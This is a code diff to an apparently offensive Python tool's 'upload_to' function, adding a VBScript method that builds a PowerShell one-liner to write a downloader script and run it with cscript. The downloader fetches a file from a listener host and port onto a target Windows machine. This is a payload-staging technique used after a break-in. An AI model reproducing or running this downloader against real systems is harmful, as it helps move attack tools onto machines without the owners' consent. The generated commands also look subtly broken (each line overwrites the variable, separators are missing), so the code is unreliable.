@@ -396,9 +396,23 @@ def upload_to(args):
                 cmd += '\$file = \'BinStream.Type = 1;\'\n'
                 cmd += '\$file = \'BinStream.Open();\'\n'
                 cmd += '\$file = \'BinStream.Write(WinHttpReq.ResponseBody);\'\n'
-                cmd += '\$file = \'BinStream.SaveToFile(WScript.Arguments(1));\'\n'
+                cmd += '\$file = \'BinStream.SaveToFile(WScript.Arguments(1));\''
                 cmd += '\$file | Out-File get.js;'
                 cmd += 'cscript.exe /nologo get.js http://' + listen_ip + ':' + listen_port + '/' + args.filename + ' ' + args.filename
+            elif choice == 'VBScript':
+                print('[+] VBScript method selected')
+                cmd = '\$file = \'dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")\'\n'
+                cmd += '\$file = \'dim bStrm: Set bStrm = createobject("Adodb.Stream")\'\n'
+                cmd += '\$file = \'xHttp.Open "GET", WScript.Arguments.Item(0), False\'\n'
+                cmd += '\$file = \'xHttp.Send\'\n\n'
+                cmd += '\$file = \'with bStrm\'\n'
+                cmd += '\$file = \'    .type = 1\'\n'
+                cmd += '\$file = \'    .open\'\n'
+                cmd += '\$file = \'    .write xHttp.responseBody\'\n'
+                cmd += '\$file = \'    .savetofile WScript.Arguments.Item(1), 2\'\n'
+                cmd += '\$file = \'end with\';'
+                cmd += '\$file | Out-File get.vbs'
+                cmd += 'cscript.exe /nologo get.vbs http://' + listen_ip + ':' + listen_port + '/' + args.filename + ' ' + args.filename
 
             else:
                 print('[!] Invalid choice')
